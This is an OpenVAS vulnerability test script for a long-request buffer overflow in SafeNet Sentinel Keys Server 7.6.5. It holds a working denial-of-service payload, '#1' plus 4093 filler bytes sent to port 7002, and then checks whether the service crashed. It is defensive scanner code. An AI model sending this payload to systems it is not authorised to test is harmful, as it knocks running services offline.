###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_safenet_spi_sk_server_long_req_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# SafeNet Sentinel Protection Installer Long Request DoS Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Sentinel Protection Installer version 7.6.5 (sntlkeyssrvr.exe v1.3.1.3)";
tag_insight = "The flaw is due to a boundary error in Sentinel Keys Server within the
  'sntlkeyssrvr.exe' when handling long requests, can be exploited to cause a
  stack-based buffer overflow via an overly-long request.";
tag_solution = "No solution or patch is available as of 25th, September 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.safenet-inc.com/support-downloads/sentinel-drivers/";
tag_summary = "The host is running Sentinel Protection Installer and is prone to denial
  of service vulnerability.";

if(description)
{
  script_id(802460);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-25 09:53:12 +0530 (Tue, 25 Sep 2012)");
  script_name("SafeNet Sentinel Protection Installer Long Request DoS Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://1337day.com/exploits/19455");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50685/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/21508/");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/50685");
  script_xref(name : "URL" , value : "http://bot24.blogspot.in/2012/09/safenet-sentinel-keys-server-dos.html");

  script_description(desc);
  script_summary("Check if Sentinel Keys Server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/www", 7002);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
banner = "";
req = "";
res = "";
soc = "";
data = "";

## Get HTTP Port
port = get_http_port(default:7002);
if(!port){
 port = 7002;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: SentinelKeysServer" >!< banner){
  exit(0);
}

## Create a socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Crap the long data and send
data = string("#1",crap(4093));
send(socket:soc, data: data);
close(soc);

## Check server is crashed or not
soc = open_sock_tcp(port);
if(soc)
{
  ## some time if server got crashed , It will respond to new sockets.
  ## so server crash confirmation is required from response page here.
  req = http_get(item:"/", port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res || "<title>Sentinel License Monitor</title>" >!< res)
  {
    close(soc);
    security_hole(port);
  }
}
else {
  security_hole(port);
}
